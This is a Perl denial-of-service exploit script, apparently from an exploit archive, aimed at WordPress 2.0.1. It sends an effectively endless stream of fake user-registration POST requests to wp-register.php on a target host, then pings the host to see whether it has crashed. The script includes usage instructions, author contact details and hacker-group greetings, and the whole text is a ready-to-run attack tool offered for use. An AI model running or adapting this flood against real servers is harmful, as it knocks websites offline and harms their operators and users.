#!perl 
#Greets to all omega-team members + h4cky0u[h4cky0u.org], lessMX6 and all dudes from #DevilDev ;)
#The exploit was tested on 10 machines but not all got flooded.Only 6/10 got crashed 
use Socket;
if (@ARGV < 2) { &usage; }
$rand=rand(10); 
$host = $ARGV[0];
$dir = $ARGV[1]; 
$host =~ s/(http:\/\/)//eg; #no http://
for ($i=0; $i<9999999999999999999999999999999999999999999999999999999999999999999999; $i++) #0_o :)
{ 
$user="\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x66\x6f\x6f".$rand.$i; #you N33d t0 be l33t t0 s33 th!S ! 
$data = "action=register&user_login=$user&user_email=$user\@matrix.org&submit=Register+%C2%BB";
$len = length $data; 
$foo = "POST   ".$dir."wp-register.php HTTP/1.1\r\n". 
               "Accept: */*\r\n".
               "Accept-Language: en-gb\r\n".
               "Content-Type: application/x-www-form-urlencoded\r\n".
               "Accept-Encoding: gzip, deflate\r\n". 
               "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n".
               "Host: $host\r\n".
               "Content-Length: $len\r\n".
               "Connection: Keep-Alive\r\n". 
               "Cache-Control: no-cache\r\n\r\n".
 "$data";
     my $port = "80";
     my $proto = getprotobyname('tcp');
     socket(SOCKET, PF_INET, SOCK_STREAM, $proto);
     connect(SOCKET, sockaddr_in($port, inet_aton($host))) || redo;
     send(SOCKET,"$foo", 0); 
     syswrite STDOUT, "+"; 
} 
#s33 if the server is down
print "\n\n";
system('ping $host');
sub usage {
print "\n\t(W)ordpress 2.0.1 (R)emote (D)oS (E)xploit (B)y matrix_killer\n";
print "\te-mail: matrix_k\@abv.bg\n";
print "\tusage: \n";
print "\t$0 <host> </dir/>\n"; 
print "\tex: $0 127.0.0.1 /wordpress/\n";
print "\tex2: $0 127.0.0.1 / (if there isn't a dir)\n";
exit();
};